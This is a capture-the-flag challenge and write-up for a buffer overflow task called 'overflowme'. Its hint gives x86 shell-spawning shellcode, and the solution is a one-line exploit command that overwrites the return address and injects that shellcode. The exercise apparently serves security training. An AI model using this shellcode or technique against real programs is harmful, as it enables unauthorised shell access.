Overflowme
==========

Read the contents of /home/user1035/problems/overflowme/key on the 
shell server.

Hints:
 - Have you heard of buffer overflows?
 - Here's a shellcode for you: `\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80`
 - Stack addresses may differ in gdb
 - `dmesg | tail -n 1` can give you a lot of info about a crashing process

Writeup
-------

    $ ./overflowme `python -c 'print "A"*64+"\x50\xd6\xff\xff"+"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"'`
